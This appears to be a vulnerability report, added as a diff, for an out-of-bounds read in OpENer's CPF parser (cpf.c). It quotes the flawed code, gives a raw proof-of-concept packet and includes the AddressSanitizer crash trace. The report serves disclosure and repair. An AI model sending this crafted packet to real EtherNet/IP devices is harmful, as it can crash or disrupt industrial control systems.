@@ -1,0 +1,104 @@
+issue #558
+
+version v2.3-558-g1e99582
+
+Commit 1e99582
+
+escription
+An out-of-bounds read vulnerability was found in OpENer in the CPF parsing logic, specifically in:
+
+CreateCommonPacketFormatStructure()
+source/src/enet_encap/cpf.c
+The issue is caused by trusting an attacker-controlled CPF item_count value without consistently validating subsequent reads against the provided data_length.
+
+During debugging, the CPF parser was entered with a 16-byte CPF slice, but the first two bytes:
+
+01 e8
+
+were parsed as:
+
+item_count = 0xe801
+
+As a result, the parser continued processing structured fields after data had already reached cpf_start + data_length, leading to an out-of-bounds read.
+
+Relevant code region:
+
+size_t length_count = 0;
+CipUint item_count = GetUintFromMessage(&data);
+// OPENER_ASSERT(4U >= item_count); /* Sanitizing data - probably needs to be changed for productive code */
+common_packet_format_data->item_count = item_count;
+...
+for(size_t j = 0; j < (address_item_count > 2 ? 2 : address_item_count); j++) /* TODO there needs to be a limit check here???*/
+{
+  common_packet_format_data->address_info_item[j].type_id =
+    GetIntFromMessage(&data);
+Actual behavior if applicable
+ASan build reports a heap-buffer-overflow
+In a non-ASan debug build, GDB shows that parsing continues even when:
+data == cpf_start + data_length
+The first invalid read is observed around:
+source/src/enet_encap/cpf.c:280
+
+PoC
+
+<6f><00><16><00><06><00><00><00><1a><00><f7><0c><40><d3><ff><7f><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><b2><00><0a><00><4c><00><20><01><24><01><30><05><91><04><00><00><00><00><00><00>
+
+ASan
+
+=================================================================
+==14630==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5060000000bc at pc 0x61b74ecb235c bp 0x7ffe079445f0 sp 0x7ffe079445e8
+READ of size 1 at 0x5060000000bc thread T0
+    #0 0x61b74ecb235b in CreateCommonPacketFormatStructure /root/OpENer/source/src/enet_encap/cpf.c:298:75
+    #1 0x61b74ecb0629 in NotifyCommonPacketFormat /root/OpENer/source/src/enet_encap/cpf.c:46:12
+    #2 0x61b74ecb62c7 in HandleReceivedSendRequestResponseDataCommand /root/OpENer/source/src/enet_encap/encap.c:558:22
+    #3 0x61b74ecb62c7 in HandleReceivedExplictTcpData /root/OpENer/source/src/enet_encap/encap.c:186:26
+    #4 0x61b74ec75bc2 in CallTcp /root/OpENer/source/src/ports/POSIX/OpENer_afl.c:163:8
+    #5 0x61b74ec75bc2 in ExecuteFallbackSinglePacket /root/OpENer/source/src/ports/POSIX/OpENer_afl.c:497:9
+    #6 0x61b74ec75bc2 in main /root/OpENer/source/src/ports/POSIX/OpENer_afl.c:515:5
+    #7 0x7cbf3522a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+    #8 0x7cbf3522a28a in __libc_start_main csu/../csu/libc-start.c:360:3
+    #9 0x61b74eb92a94 in _start (/home/ivcm/OpENer/poc/OpENer_afl_asan+0x70a94) (BuildId: d74ed6c3acba79ce)
+
+0x5060000000bc is located 0 bytes after 60-byte region [0x506000000080,0x5060000000bc)
+allocated by thread T0 here:
+    #0 0x61b74ec2d8e3 in malloc (/home/ivcm/OpENer/poc/OpENer_afl_asan+0x10b8e3) (BuildId: d74ed6c3acba79ce)
+    #1 0x61b74ec75a8a in CallTcp /root/OpENer/source/src/ports/POSIX/OpENer_afl.c:154:28
+    #2 0x61b74ec75a8a in ExecuteFallbackSinglePacket /root/OpENer/source/src/ports/POSIX/OpENer_afl.c:497:9
+    #3 0x61b74ec75a8a in main /root/OpENer/source/src/ports/POSIX/OpENer_afl.c:515:5
+    #4 0x7cbf3522a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+    #5 0x7cbf3522a28a in __libc_start_main csu/../csu/libc-start.c:360:3
+    #6 0x61b74eb92a94 in _start (/home/ivcm/OpENer/poc/OpENer_afl_asan+0x70a94) (BuildId: d74ed6c3acba79ce)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /root/OpENer/source/src/enet_encap/cpf.c:298:75 in CreateCommonPacketFormatStructure
+Shadow bytes around the buggy address:
+  0x505ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x505ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x505fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x505fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x506000000000: fa fa fa fa 00 00 00 00 00 00 04 fa fa fa fa fa
+=>0x506000000080: 00 00 00 00 00 00 00[04]fa fa fa fa fa fa fa fa
+  0x506000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x506000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x506000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x506000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x506000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==14630==ABORTING
